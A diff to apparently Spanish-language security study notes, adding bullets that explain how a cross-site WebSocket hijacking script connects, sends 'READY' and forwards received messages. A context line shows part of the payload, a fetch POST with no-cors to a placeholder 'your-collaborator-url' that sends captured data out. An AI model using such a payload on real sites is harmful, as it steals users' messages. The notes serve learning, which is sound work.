@@ -24,6 +24,24 @@ fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: e
 </script>
 ```
 
+- **Se conecta a un servidor WebSocket**
+    
+    - El navegador establece una conexión con un servidor remoto (controlado por el atacante o sistema).
+        
+    - Esta conexión se mantiene abierta para recibir mensajes en tiempo real.
+        
+- **Envía una señal de "listo"**
+    
+    - Al establecer la conexión, el navegador envía un mensaje tipo `"READY"` para avisar que está conectado y esperando instrucciones.
+        
+- **Escucha mensajes entrantes**
+    
+    - El servidor WebSocket puede enviar mensajes al navegador.
+        
+- **Reenvía esos mensajes a otro servidor**
+    
+    - Cada mensaje recibido es automáticamente enviado (como una solicitud POST) a otra URL, generalmente bajo control del atacante o 
+
 ![[Pasted image 20250729142914.png]]
 
 ![[Pasted image 20250729142857.png]]
